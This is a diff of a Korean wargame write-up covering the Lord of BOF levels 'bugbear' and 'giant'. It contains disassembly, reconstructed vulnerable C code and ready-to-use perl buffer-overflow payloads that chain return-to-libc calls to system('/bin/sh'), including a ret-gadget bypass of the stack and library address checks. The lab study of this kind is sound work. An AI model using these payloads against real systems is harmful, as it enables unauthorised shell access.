@@ -615,439 +615,415 @@ ebp는 호출되기 전에 실행되고있던 함수의 ebp
 
 ## (14) LEVEL14: bugbear / new divide
 
-  0x8048560  <main>:       push   %ebp   0x8048561  <main+1>:     mov    %ebp,%esp     0x8048563  <main+3>:     sub    %esp,60     0x8048566  <main+6>:     cmp    DWORD PTR  [%ebp+8],1   0x804856a  <main+10>:    jg     0x8048583  <main+35>   0x804856c  <main+12>:    push   0x8048700   0x8048571  <main+17>:    call   0x8048444  <printf>   0x8048576  <main+22>:    add    %esp,4     0x8048579  <main+25>:    push   0   0x804857b  <main+27>:    call   0x8048474  <exit>   0x8048580  <main+32>:    add    %esp,4     0x8048583  <main+35>:    push   0x804870c   0x8048588  <main+40>:    push   0x8048720   0x804858d  <main+45>:    call   0x8048404 <popen>   0x8048592  <main+50>:    add    %esp,8     0x8048595  <main+53>:    mov    %eax,%eax   0x8048597  <main+55>:    mov    DWORD PTR  [%ebp-44],%eax   0x804859a  <main+58>:    mov    %eax,DWORD PTR  [%ebp-44]   0x804859d  <main+61>:    push   %eax   0x804859e  <main+62>:    push   0xff   0x80485a3  <main+67>:    lea    %eax,[%ebp-40]   0x80485a6  <main+70>:    push   %eax    0x80485a7  <main+71>:    call   0x8048424  <fgets>   0x80485ac  <main+76>:    add    %esp,12     0x80485af  <main+79>:    lea    %eax,[%ebp-48]   0x80485b2  <main+82>:    push   %eax   0x80485b3  <main+83>:    push   0x804876b   0x80485b8  <main+88>:    lea    %eax,[%ebp-40]   0x80485bb <main+91>:     push   %eax   0x80485bc  <main+92>:    call   0x8048484  <sscanf>   0x80485c1  <main+97>:    add    %esp,12     0x80485c4  <main+100>:   mov    %eax,DWORD PTR [%ebp-44]   0x80485c7  <main+103>:   push   %eax   0x80485c8  <main+104>:   call   0x8048464 <fclose>   0x80485cd <main+109>:    add    %esp,4     0x80485d0  <main+112>:   push   0x804870c   0x80485d5 <main+117>:    push   0x8048780   0x80485da  <main+122>:   call   0x8048404 <popen>   0x80485df <main+127>:    add    %esp,8     0x80485e2  <main+130>:   mov    %eax,%eax   0x80485e4 <main+132>:    mov    DWORD PTR [%ebp-44],%eax   0x80485e7  <main+135>:   mov    %eax,DWORD PTR [%ebp-44]   0x80485ea  <main+138>:   push   %eax   0x80485eb  <main+139>:   push   0xff   0x80485f0 <main+144>:    lea    %eax,[%ebp-40]   0x80485f3  <main+147>:   push   %eax   0x80485f4 <main+148>:    call   0x8048424 <fgets>   0x80485f9  <main+153>:   add    %esp,12     0x80485fc <main+156>:    lea    %eax,[%ebp-52]   0x80485ff  <main+159>:   push   %eax   0x8048600 <main+160>:    push   0x80487c8   0x8048605  <main+165>:   lea    %eax,[%ebp-40]   0x8048608 <main+168>:    push   %eax   0x8048609  <main+169>:   call   0x8048484 <sscanf>   0x804860e <main+174>:    add    %esp,12     0x8048611  <main+177>:   mov    %eax,DWORD PTR [%ebp-44]   0x8048614  <main+180>:   push   %eax   0x8048615  <main+181>:   call   0x8048464 <fclose>   0x804861a <main+186>:    add    %esp,4     0x804861d  <main+189>:   mov    %eax,DWORD PTR [%ebp-48]   0x8048620  <main+192>:   mov    %edx,DWORD PTR  [%ebp-52]   0x8048623  <main+195>:   lea    %ecx,[%edx+%eax*1]   0x8048626  <main+198>:   mov    DWORD PTR  [%ebp-56],%ecx     0x8048629  <main+201>:   push   4   0x804862b  <main+203>:   mov    %eax,DWORD PTR  [%ebp+12]   0x804862e  <main+206>:   add    %eax,4   0x8048631  <main+209>:   mov    %edx,DWORD PTR  [%eax]   0x8048633  <main+211>:   add    %edx,44   0x8048636 <main+214>:    push   %edx   0x8048637  <main+215>:   lea    %eax,[%ebp-60]   0x804863a <main+218>:    push   %eax   0x804863b  <main+219>:   call   0x8048454 <memcpy>   0x8048640 <main+224>:    add    %esp,12     0x8048643  <main+227>:   mov    %eax,DWORD PTR [%ebp-60]   0x8048646  <main+230>:   cmp    %eax,DWORD PTR  [%ebp-56]   0x8048649  <main+233>:   je     0x8048662  <main+258>   0x804864b  <main+235>:   push   0x80487cb   0x8048650  <main+240>:   call   0x8048444 <printf>   0x8048655  <main+245>:   add    %esp,4     0x8048658  <main+248>:   push   0   0x804865a <main+250>:    call   0x8048474 <exit>   0x804865f  <main+255>:   add    %esp,4     0x8048662 <main+258>:    mov    %eax,DWORD PTR [%ebp+12]   0x8048665  <main+261>:   add    %eax,4   0x8048668 <main+264>:    mov    %edx,DWORD PTR [%eax]   0x804866a  <main+266>:   push   %edx   0x804866b <main+267>:    lea    %eax,[%ebp-40]   0x804866e  <main+270>:   push   %eax   0x804866f <main+271>:    call   0x8048494 <strcpy>   0x8048674  <main+276>:   add    %esp,8     0x8048677 <main+279>:    lea    %eax,[%ebp-40]   0x804867a  <main+282>:   push   %eax   0x804867b <main+283>:    push   0x80487e1   0x8048680  <main+288>:   call   0x8048444 <printf>   0x8048685 <main+293>:    add    %esp,8     0x8048688  <main+296>:   leave   0x8048689  <main+297>:   ret	에필로그   60바이트  스텍메모리 할당   char buffer40,    char *ebp_44 , char *ebp_48, char *  ebp_52, char * ebp_56, char *ebp_60       if(argc<=1){     printf("argv  error\n");         exit(0);     }     popen     r   /usr/bin/ldd /home/giant/assassin \|  /bin/grep libc \| /bin/awk '{print $4}'   popen( "/usr~" ,  "r" );       ebp_44=popen( "/usr" ,  "r");           fgets(buffer , 255 , ebp_44);           sscanf(buffer,"(%x)",ebp_48);               fclose(ebp_44);         "r"    "/usr/bin/nm  /lib/libc.so.6 \| /bin/grep __execve \| /bin/awk '{print $1}'"   popen( "/usr/~~~" ,  "r" );               fgets(buffer,255,ebp_44);                   sscanf(buffer,"%x",ebp_52);               fclose(ebp_44);         ebp_56=ebp_52+ebp_48                 memcpy( ebp_60,argv1, 4  );             if( ebp_60 != ebp_56){   printf( "You must use  execve!\n");   exit(0);   }                 strcpy( buffer , argv[1] )                     printf("%s\n",buffer);
-                                          	                                        
+### 문제 개요
 
-/* 함수 원형 */
+**assembly 코드**
 
-\1. popen
+```
+0x8048560  <main>:       push   %ebp
+0x8048561  <main+1>:     mov    %ebp,%esp
+0x8048563  <main+3>:     sub    %esp,60
 
+0x8048566  <main+6>:     cmp    DWORD PTR  [%ebp+8],1
+0x804856a  <main+10>:    jg     0x8048583  <main+35>
+0x804856c  <main+12>:    push   0x8048700   
+0x8048571  <main+17>:    call   0x8048444  <printf>
+0x8048576  <main+22>:    add    %esp,4     
+
+0x8048579  <main+25>:    push   0   
+0x804857b  <main+27>:    call   0x8048474  <exit>
+0x8048580  <main+32>:    add    %esp,4     
+
+0x8048583  <main+35>:    push   0x804870c   
+0x8048588  <main+40>:    push   0x8048720   
+0x804858d  <main+45>:    call   0x8048404 <popen>
+0x8048592  <main+50>:    add    %esp,8     
+
+0x8048595  <main+53>:    mov    %eax,%eax   
+0x8048597  <main+55>:    mov    DWORD PTR  [%ebp-44],%eax   
+0x804859a  <main+58>:    mov    %eax,DWORD PTR  [%ebp-44]   
+0x804859d  <main+61>:    push   %eax   
+0x804859e  <main+62>:    push   0xff   
+0x80485a3  <main+67>:    lea    %eax,[%ebp-40]   
+0x80485a6  <main+70>:    push   %eax    
+0x80485a7  <main+71>:    call   0x8048424  <fgets>   
+0x80485ac  <main+76>:    add    %esp,12     
+
+0x80485af  <main+79>:    lea    %eax,[%ebp-48]   
+0x80485b2  <main+82>:    push   %eax   
+0x80485b3  <main+83>:    push   0x804876b   
+0x80485b8  <main+88>:    lea    %eax,[%ebp-40]   
+0x80485bb  <main+91>:    push   %eax   
+0x80485bc  <main+92>:    call   0x8048484  <sscanf>   
+0x80485c1  <main+97>:    add    %esp,12     
+
+0x80485c4  <main+100>:   mov    %eax,DWORD PTR [%ebp-44]   
+0x80485c7  <main+103>:   push   %eax   
+0x80485c8  <main+104>:   call   0x8048464 <fclose>   
+0x80485cd  <main+109>:   add    %esp,4     
+
+0x80485d0  <main+112>:   push   0x804870c   
+0x80485d5  <main+117>:   push   0x8048780   
+0x80485da  <main+122>:   call   0x8048404 <popen>   
+0x80485df  <main+127>:   add    %esp,8     
+
+0x80485e2  <main+130>:   mov    %eax,%eax   
+0x80485e4  <main+132>:   mov    DWORD PTR [%ebp-44],%eax   
+0x80485e7  <main+135>:   mov    %eax,DWORD PTR [%ebp-44]   
+0x80485ea  <main+138>:   push   %eax   
+0x80485eb  <main+139>:   push   0xff   
+0x80485f0  <main+144>:   lea    %eax,[%ebp-40]   
+0x80485f3  <main+147>:   push   %eax   
+0x80485f4  <main+148>:   call   0x8048424 <fgets>   
+0x80485f9  <main+153>:   add    %esp,12     
+
+0x80485fc  <main+156>:   lea    %eax,[%ebp-52]   
+0x80485ff  <main+159>:   push   %eax   
+0x8048600  <main+160>:   push   0x80487c8   
+0x8048605  <main+165>:   lea    %eax,[%ebp-40]   
+0x8048608  <main+168>:   push   %eax   
+0x8048609  <main+169>:   call   0x8048484 <sscanf>   
+0x804860e  <main+174>:   add    %esp,12     
+
+0x8048611  <main+177>:   mov    %eax,DWORD PTR [%ebp-44]   
+0x8048614  <main+180>:   push   %eax   
+0x8048615  <main+181>:   call   0x8048464 <fclose>   
+0x804861a  <main+186>:   add    %esp,4     
+
+0x804861d  <main+189>:   mov    %eax,DWORD PTR [%ebp-48]   
+0x8048620  <main+192>:   mov    %edx,DWORD PTR  [%ebp-52]   
+0x8048623  <main+195>:   lea    %ecx,[%edx+%eax*1]   
+0x8048626  <main+198>:   mov    DWORD PTR  [%ebp-56],%ecx     
+
+0x8048629  <main+201>:   push   4   
+0x804862b  <main+203>:   mov    %eax,DWORD PTR  [%ebp+12]   
+0x804862e  <main+206>:   add    %eax,4   
+0x8048631  <main+209>:   mov    %edx,DWORD PTR  [%eax]   
+0x8048633  <main+211>:   add    %edx,44   
+0x8048636  <main+214>:   push   %edx   
+0x8048637  <main+215>:   lea    %eax,[%ebp-60]   
+0x804863a  <main+218>:   push   %eax   
+0x804863b  <main+219>:   call   0x8048454 <memcpy>   
+0x8048640  <main+224>:   add    %esp,12     
+
+0x8048643  <main+227>:   mov    %eax,DWORD PTR [%ebp-60]   
+0x8048646  <main+230>:   cmp    %eax,DWORD PTR  [%ebp-56]   
+0x8048649  <main+233>:   je     0x8048662  <main+258>   
+0x804864b  <main+235>:   push   0x80487cb   
+0x8048650  <main+240>:   call   0x8048444 <printf>   
+0x8048655  <main+245>:   add    %esp,4     
+
+0x8048658  <main+248>:   push   0   
+0x804865a  <main+250>:   call   0x8048474 <exit>   
+0x804865f  <main+255>:   add    %esp,4     
+
+0x8048662  <main+258>:   mov    %eax,DWORD PTR [%ebp+12]   
+0x8048665  <main+261>:   add    %eax,4   
+0x8048668  <main+264>:   mov    %edx,DWORD PTR [%eax]   
+0x804866a  <main+266>:   push   %edx   
+0x804866b  <main+267>:   lea    %eax,[%ebp-40]   
+0x804866e  <main+270>:   push   %eax   
+0x804866f  <main+271>:   call   0x8048494 <strcpy>   
+0x8048674  <main+276>:   add    %esp,8     
+
+0x8048677  <main+279>:   lea    %eax,[%ebp-40]   
+0x804867a  <main+282>:   push   %eax   
+0x804867b  <main+283>:   push   0x80487e1   
+0x8048680  <main+288>:   call   0x8048444 <printf>   
+0x8048685  <main+293>:   add    %esp,8     
+
+0x8048688  <main+296>:   leave   
+0x8048689  <main+297>:   ret	
+```
+
+### 참고: 함수 원형
+1. popen
+```
 #include <stdio.h>
-
 FILE *popen(const char *command, const char *type);
-
-\2. fgets
-
+```
+2. fgets
+```
 #include <stdio.h>
-
 char *fgets(char *s, int size, FILE *stream);
-
-\3. sscanf
-
- #include <stdio.h>
-
+```
+3. sscanf
+```
+#include <stdio.h>
 int sscanf( const char *str, const char *format, ...);
-
+```
 4. fclose
-
+```
 #include <stdio.h>
-
 int fclose( FILE *stream);
-
-\5. memcpy
-
+```
+5. memcpy
+```
 #include <string.h>
-
- void *memcpy(void *dest, const void
-
-*src, size_t n);
-
-\6. execve
-
+void *memcpy(void *dest, const void *src, size_t n);
+```
+6. execve
+```
 NAME
+  execve - execute program
 
-execve - execute program
+SYNOPSIS
+  #include <unistd.h>
+  int  execve  (const  char  *filename, char *const argv[],
+  char *const envp[]);
+  
+DESCRIPTION
+  execve() executes the  program  pointed  to  by filename. filename  must  be either a binary executable, or a script starting with a line of the form "#!  interpreter [arg]". In  the latter case, the interpreter must be a valid path name for an executable which is not itself a script, which will be invoked as interpreter [arg] filename.
+```
 
- SYNOPSIS
+**c언어로 예측하여 변환한 코드**
 
-#include <unistd.h>
-
-int  execve  (const  char  *filename, char *const argv
-
-[],
-
-char *const envp[]);
-
- DESCRIPTION
-
-execve() executes the  program  pointed  to  by 
-
-filename.
-
-filename  must  be either a binary executable, or a script
-
-starting with a line of the form "#!  interpreter 
-
-[arg]".
-
-In  the latter case, the interpreter must be a valid path
-
-        name for
-
-an executable which is not itself a script, which
-
-will be invoked as interpreter [arg] filename.
-
-/* 원본 c코드 시작 */
-
+```
 #include <stdio.h>
-
 #include <string.h>
-
 #include <unistd.h>
 
-int main( int argc, char *argv[] ){
-
-char buffer[40]; //[ebp-40], 
-
- FILE *fp;     //ebp-44
-
-char *offset;     //ebp-48
-
-char *addr;         //ebp-52
-
-char *execv;           //ebp-56
-
-char *ret;     //ebp-60
-
- if(argc<=1){
-
-  printf("argv
-
-error\n");
-
-  exit(0);
-
- }
-
- ebp_44=popen( "/usr/bin/ldd
-
-/home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'
-
-"  , "r" );
-
-fgets( buffer , 255 , ebp_44);
-
- sscanf( buffer,"(%x)",
-
-ebp_48);
-
- fclose( ebp_44 );
-
- popen(  "/usr/bin/nm
-
-/lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}' "  ,
-
-"r" ); // popen으로 열어야 결과값을 가져올 수 있음
-
-fgets(buffer,255,ebp_44);
-
- sscanf(buffer,"%x",&addr);
-
- fclose(ebp_44);
-
- execv=addr+offset;
-
- memcpy( &ret,&(argv1), 4
-
-);
-
- if( execv != ret ){
-
- printf( "You must use
-
-execve!\n");
-
- exit(0);
-
- }
-
- strcpy( buffer , argv[1] )
-
- printf("%s\n",buffer);
-
-/* c코드 종료 */
-
-/* 공략할 c코드 */
-
-#include <stdio.h>
-
- #include <string.h>
-
- #include
-
-<unistd.h>
-
- int main( int argc, char * argv[]){
-
- char buffer[40]; //[ebp-40],
-
- FILE *fp;
-
- char *offset;
-
- char *addr;
-
- char *execv;
-
- char *ret;
-
- if(argc<=1){
-
- printf("argv error\n");
-
- exit(0);
-
- }
-
- fp=popen( "/usr/bin/ldd
-
-/home/bugbear/giant | /bin/grep libc | /bin/awk '{print $4}'" , "r"
-
-);
-
- fgets(buffer , 255 , fp);
-
- sscanf(buffer,"(%x)",offset);
-
- fclose(fp);
-
-popen(  "/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve |
-
-/bin/awk '{print $1}' "  , "r" );
-
- fgets(buffer,255,fp);
-
- sscanf(buffer,"%x",addr);
-
- fclose(fp);
-
- execv=addr+(int)offset;
-
- memcpy( ret, &(argv1), 4
-
-);
-
- if( ret !=
-
-execv){
-
- printf( "You must use
-
-execve!\n");
-
- exit(0);
-
- }
-
- strcpy( buffer , argv[1] );
-
- printf("%s\n",buffer);
-
- return 0;
-
- }
+int main( int argc, char * argv[]){
+  char buffer[40]; //[ebp-40],
+  FILE *fp;
+  char *offset;
+  char *addr;
+  char *execv;
+  char *ret;
+  
+  if(argc<=1){
+    printf("argv error\n");
+    exit(0);
+  }
+  
+  fp=popen( "/usr/bin/ldd/home/bugbear/giant | /bin/grep libc | /bin/awk '{print $4}'" , "r");
+  fgets(buffer , 255 , fp);
+  sscanf(buffer,"(%x)",offset);
+  fclose(fp);
+  
+  popen("/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'", "r");
+  fgets(buffer,255,fp);
+  sscanf(buffer,"%x",addr);
+  fclose(fp);
+  
+  execv = addr + (int)offset;
+  memcpy( ret, &(argv1), 4);
+  
+  if(ret != execv){
+    printf("You must use execve!\n");
+    exit(0);
+  }
+  
+  strcpy(buffer, argv[1]);
+  printf("%s\n",buffer);
+  
+  return 0;
+}
 
 /usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'
-
 -->접근권한이 없어서 접근 불가
 
 /usr/bin/ldd /home/bugbear/giant | /bin/grep libc | /bin/awk '{print$4}'
-
 --> 실행 가능.
 
 ldd명령어: 해당 바이너리가 가리키는 라이브러리 보여줌
-
 awk: 해당 명령어를 공백과 탭을 이용해서 구분해줌. {print $4} ==> 4번째 출력을의미함.
-
 (결과) (0x40018000): libc(표준라이브러리 시작주소
 
 /usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'
 
-nm: /usr/bin/nm /lib/libc.so.6 해당
-
-명령어가 제공하는 라이브러리 파일 볼 수 있음.
-
+nm: /usr/bin/nm /lib/libc.so.6 해당 명령어가 제공하는 라이브러리 파일 볼 수 있음
 offset: 첫번재부터 해당 함수까지 거리 ==>(결과) 00091d48
-
-시작주소+offset하면 실제 주소 얻어올 수 있음.
+시작주소+offset하면 실제 주소 얻어올 수 있음
 
 0x400a9d48 <__execve>
-
 0x40058ae0 <__libc_system>
-
 "/bin/sh" is at 0x400fbff9
+```
 
-/* /bin/sh 찾는 프로그램
+#### /bin/sh 찾는 프로그램
 
-*/
-
+```
 int main(int argc, char **argv){
-
-long shell;
-
-shell=0x4005e430;
-
-while(memcmp((void*)shell,"/bin/sh",8)) shell++;
-
-printf("\"/bin/sh\" is at 0x%x\n",shell);
-
+  long shell;
+  shell = 0x4005e430;
+  
+  while(memcmp((void*)shell,"/bin/sh",8)) shell++;
+  
+  printf("\"/bin/sh\" is at 0x%x\n",shell);
 }
+```
 
-execv()쓰는 법
-
+#### execv()쓰는 법
+```
 #include <unistd.h>
-
 // int execve( const char *filename, char *const argv[], char *constenvp[]);
 
-int main()
-
-char *shell[2];
-
-shell[0]="/bin/sh";
-
-shell[1]=NULL;
-
-execve("/bin/sh",shell,NULL);
-
-return 0;
-
+int main(){
+  char *shell[2];
+  
+  shell[0]="/bin/sh";
+  shell[1]=NULL;
+  
+  execve("/bin/sh",shell,NULL);
+  return 0;
 }
 
 execve: 0x400a9d48
 
 r $(perl -e 'print "a"x44 . "\x48\x9d\x0a\x40"')
 
-char *argv[]=>주소[NULL]
+char *argv[] => 주소[NULL]
 
 execve: 0x400a9d48
-
 /bin/sh: 0x400fbff9
-
 *argv[]: bffffb74(앞에는상관없고 뒤가 NULL이기만 하면 사용가능)
-
 NULL: bffffb78 
 
 buffer[40]
-
 [쓰레기값44] + [(execve)함수호출주소] + [(system)함수호출주소]+ [호출된system함수의 ret주소=>쓰레기값으로 채워줌(4바이트)] + [system함수의 인자값: (/bin/sh)의 주소]
 
 ./giant "$(perl -e 'print "a"x44 ."\x48\x9d\x0a\x40" . "\xe0\x8a\x05\x40" . "a"x4 ."\xf9\xbf\x0f\x40"')"
 
-*펄/파이썬에서 \x0a가 new line이므로 \x00 으로 인식하는 버그 있음=>""로 감싸주면
-
-해결 가능.
+*펄/파이썬에서 \x0a가 new line이므로 \x00 으로 인식하는 버그 있음=>""로 감싸주면 해결 가능
 
 *참고 execv함수: 다른 프로그램을 실행시키는 함수
 
-인용구
-
-'' : 특수기호를 무시하는 기능
-
-"": 특수문자 보호
-
-mkdir my dir=> my, dir이라는
-
-두가지 디렉터리 생성
-
-mkdir "my dir" ==> my dir이라는디렉터리 생성.
-
-echo $SHELL (ex: $=> 뒤의
-
-내용이 변수임을 알려줌.)
-
-주소 [NULL]
-
-./giant "$(perl -e 'print "a"x44 . "\x48\x9d\x0a\x40"
-
-. "aaaa" . "\xf9\xbf\x0f\x40" .
-
-"\x94\xfb\xff\xbf" . "\x78\xfb\xff\xbf"')"
+./giant "$(perl -e 'print "a"x44 . "\x48\x9d\x0a\x40" . "aaaa" . "\xf9\xbf\x0f\x40" . "\x94\xfb\xff\xbf" . "\x78\xfb\xff\xbf"')"
 
 \x74~~>\x94에서 깨짐.
 
 execve호출->system호출->더미4->/bin/sh주소 해도 상관없음
+```
 
-  0x8048470  <main>:       push   %ebp   0x8048471  <main+1>:     mov    %ebp,%esp    0x8048473 <main+3>:     sub     %esp,40       0x8048476  <main+6>:     cmp    DWORD PTR  [%ebp+8],1   0x804847a  <main+10>:    jg     0x8048493  <main+35>   0x804847c  <main+12>:    push   0x8048570   0x8048481  <main+17>:    call   0x8048378  <printf>   0x8048486  <main+22>:    add    %esp,4       0x8048489  <main+25>:    push   0   0x804848b  <main+27>:    call   0x8048388  <exit>   0x8048490 <main+32>:     add    %esp,4    0x8048493 <main+35>:    mov     %eax,DWORD PTR [%ebp+12]   0x8048496  <main+38>:    add    %eax,4   0x8048499 <main+41>:     mov    %edx,DWORD PTR [%eax]   0x804849b  <main+43>:    add    %edx,47   0x804849e  <main+46>:    cmp    BYTE PTR  [%edx],0xbf   0x80484a1  <main+49>:    jne    0x80484c0  <main+80>   0x80484a3  <main+51>:    push   0x804857c   0x80484a8  <main+56>:    call   0x8048378  <printf>   0x80484ad  <main+61>:    add    %esp,4       0x80484b0  <main+64>:    push   0   0x80484b2  <main+66>:    call   0x8048388 <exit>  0x80484b7  <main+71>:    add    %esp,4       0x80484ba  <main+74>:    lea    %esi,[%esi]   0x80484c0  <main+80>:    mov    %eax,DWORD PTR  [%ebp+12]   0x80484c3  <main+83>:    add    %eax,4   0x80484c6  <main+86>:    mov    %edx,DWORD PTR  [%eax]   0x80484c8  <main+88>:    add    %edx,47   0x80484cb  <main+91>:    cmp    BYTE PTR [%edx],0x40   0x80484ce  <main+94>:    jne    0x80484e7  <main+119>   0x80484d0  <main+96>:    push   0x8048591   0x80484d5  <main+101>:   call   0x8048378 <printf>   0x80484da  <main+106>:   add    %esp,4       0x80484dd  <main+109>:   push   0   0x80484df  <main+111>:   call   0x8048388 <exit>  0x80484e4  <main+116>:   add    %esp,4       0x80484e7  <main+119>:   mov    %eax,DWORD PTR  [%ebp+12]   0x80484ea  <main+122>:   add    %eax,4   0x80484ed  <main+125>:   mov    %edx,DWORD PTR  [%eax]   0x80484ef  <main+127>:   push   %edx   0x80484f0 <main+128>:    lea    %eax,[%ebp-40]   0x80484f3  <main+131>:   push   %eax   0x80484f4  <main+132>:   call   0x80483a8 <strcpy>   0x80484f9  <main+137>:   add    %esp,8    0x80484fc <main+140>:   lea     %eax,[%ebp-40]   0x80484ff  <main+143>:   push   %eax   0x8048500 <main+144>:    push   0x80485ae   0x8048505  <main+149>:   call   0x8048378 <printf>   0x804850a <main+154>:    add    %esp,8    0x804850d <main+157>:   push   44   0x804850f  <main+159>:   push   0   0x8048511 <main+161>:    lea    %eax,[%ebp-40]   0x8048514  <main+164>:   push   %eax   0x8048515  <main+165>:   call   0x8048398 <memset>   0x804851a  <main+170>:   add    %esp,12    0x804851d <main+173>:   leave   0x804851e  <main+174>:   ret   0x804851f  <main+175>:   nop	에필로그       스택  40바이트     if(argv<=1){   printf("argv  error\n")   exit(0);   }                 if(argv1==0xbf{   printf("stack retbayed  you!\n");                 exit(0);   }               if(argv1=="\x40"   printf( "library retbayed you,  too!!\n" );             exit(0);   }       strcpy(buffer,argv[1]);                   printf("%s\n",buffer);               memset(buffer,0,44);
-                                          	                                        
+## (15) LEVEL 15: giant / one step closer
 
-/* c코드 시작
+### 문제 개요
+**assembly 코드**
+```
+0x8048470  <main>:       push   %ebp   
+0x8048471  <main+1>:     mov    %ebp,%esp    
 
-*/
+0x8048473  <main+3>:     sub    %esp,40       
 
+0x8048476  <main+6>:     cmp    DWORD PTR  [%ebp+8],1   
+0x804847a  <main+10>:    jg     0x8048493  <main+35>   
+0x804847c  <main+12>:    push   0x8048570   
+0x8048481  <main+17>:    call   0x8048378  <printf>   
+0x8048486  <main+22>:    add    %esp,4       
+
+0x8048489  <main+25>:    push   0   
+0x804848b  <main+27>:    call   0x8048388  <exit>   
+0x8048490  <main+32>:    add    %esp,4    
+
+0x8048493  <main+35>:    mov    %eax,DWORD PTR [%ebp+12]   
+0x8048496  <main+38>:    add    %eax,4   
+0x8048499  <main+41>:    mov    %edx,DWORD PTR [%eax]   
+0x804849b  <main+43>:    add    %edx,47   
+0x804849e  <main+46>:    cmp    BYTE PTR  [%edx],0xbf   
+0x80484a1  <main+49>:    jne    0x80484c0  <main+80>   
+0x80484a3  <main+51>:    push   0x804857c   
+0x80484a8  <main+56>:    call   0x8048378  <printf>   
+0x80484ad  <main+61>:    add    %esp,4       
+
+0x80484b0  <main+64>:    push   0   
+0x80484b2  <main+66>:    call   0x8048388 <exit>  
+0x80484b7  <main+71>:    add    %esp,4       
+
+0x80484ba  <main+74>:    lea    %esi,[%esi]   
+0x80484c0  <main+80>:    mov    %eax,DWORD PTR  [%ebp+12]   
+0x80484c3  <main+83>:    add    %eax,4   
+0x80484c6  <main+86>:    mov    %edx,DWORD PTR  [%eax]   
+0x80484c8  <main+88>:    add    %edx,47   
+0x80484cb  <main+91>:    cmp    BYTE PTR [%edx],0x40   
+0x80484ce  <main+94>:    jne    0x80484e7  <main+119>   
+0x80484d0  <main+96>:    push   0x8048591   
+0x80484d5  <main+101>:   call   0x8048378 <printf>   
+0x80484da  <main+106>:   add    %esp,4       
+
+0x80484dd  <main+109>:   push   0   
+0x80484df  <main+111>:   call   0x8048388 <exit>  
+0x80484e4  <main+116>:   add    %esp,4       
+
+0x80484e7  <main+119>:   mov    %eax,DWORD PTR  [%ebp+12]   
+0x80484ea  <main+122>:   add    %eax,4   
+0x80484ed  <main+125>:   mov    %edx,DWORD PTR  [%eax]   
+0x80484ef  <main+127>:   push   %edx   
+0x80484f0  <main+128>:   lea    %eax,[%ebp-40]   
+0x80484f3  <main+131>:   push   %eax   
+0x80484f4  <main+132>:   call   0x80483a8 <strcpy>   
+0x80484f9  <main+137>:   add    %esp,8    
+
+0x80484fc  <main+140>:   lea    %eax,[%ebp-40]   
+0x80484ff  <main+143>:   push   %eax   
+0x8048500  <main+144>:   push   0x80485ae   
+0x8048505  <main+149>:   call   0x8048378 <printf>   
+0x804850a  <main+154>:   add    %esp,8    
+
+0x804850d  <main+157>:   push   44   
+0x804850f  <main+159>:   push   0   
+0x8048511  <main+161>:   lea    %eax,[%ebp-40]   
+0x8048514  <main+164>:   push   %eax   
+0x8048515  <main+165>:   call   0x8048398 <memset>   
+0x804851a  <main+170>:   add    %esp,12    
+
+0x804851d  <main+173>:   leave   
+0x804851e  <main+174>:   ret   
+0x804851f  <main+175>:   nop
+```
+
+**c언어로 예측하여 변환한 코드**
+```
 char buffer[40];
-
 if(argv<=1){
-
- printf("argv
-
-error\n")
-
- exit(0);
-
- }
-
- if(argv1=="0xbf"){
-
- printf("stack retbayed
-
-you!\n");
-
- exit(0);
-
- }
-
-if(argv1=="\x40"){
-
- printf( "library retbayed
-
-you, too!!\n" );
-
- exit(0);
-
- }
-
- strcpy(buffer,argv[1]);
-
- printf("%s\n",buffer);
-
- memset(buffer,0,44);
-
-0x40058ae0 <__libc_system>
-
-"/bin/sh" is at 0x400fbff9
-
-/* /bin/sh 찾는 프로그램
-
-*/
-
-int main(int argc, char **argv){
-
-long shell;
-
-shell=0x4005e430;
-
-while(memcmp((void*)shell,"/bin/sh",8)) shell++;
-
-printf("\"/bin/sh\" is at 0x%x\n",shell);
-
+  printf("argv error\n");
+  exit(0);
 }
 
-스택 메모리 못씀, 공유라이브러리 못씀.
+if(argv1 == "0xbf"){
+  printf("stack retbayed you!\n");
+  exit(0);
+}
 
-텍스트메모리영역(08로 시작하는 주소) 사용 가능.
+if(argv1 == "\x40"){
+  printf( "library retbayed you, too!!\n");
+  exit(0);
+}
 
-이 문제는 bash바꾸지 않아도 상관없음
+strcpy(buffer,argv[1]);
+printf("%s\n",buffer);
 
+memset(buffer,0,44);
+
+0x40058ae0 <__libc_system>
+"/bin/sh" is at 0x400fbff9
+```
+
+**/bin/sh 찾는 프로그램**
+```
+int main(int argc, char **argv){
+  long shell;
+  shell=0x4005e430;
+  while(memcmp((void*)shell,"/bin/sh",8)) shell++;
+  printf("\"/bin/sh\" is at 0x%x\n",shell);
+}
+```
+
+### 제약조건
+- 스택 메모리 못씀
+- 공유라이브러리 못씀
+- 텍스트메모리영역(08로 시작하는 주소) 사용 가능
+- 이 문제는 bash바꾸지 않아도 상관없음
+
+### 문제풀이
+```
 buffer[40]
-
 [쓰레기값44] + [(ret)함수호출주소] + [(system)함수호출주소] + [호출된system함수의 ret주소=>쓰레기값으로 채워줌(4바이트)] + [system함수의 인자값: (/bin/sh)의 주소]
 
-./assassin $(perl -e 'print "a"x44 .
+./assassin $(perl -e 'print "a"x44 . "\x1e\x85\x04\x08" . "\xe0\x8a\x05\x40" . "a"x4 . "\xf9\xbf\x0f\x40"')
+```
 
-"\x1e\x85\x04\x08" . "\xe0\x8a\x05\x40" . "a"x4 .
-
-"\xf9\xbf\x0f\x40"')
+## (16) LEVEL 16: assassin / pushing me away
 
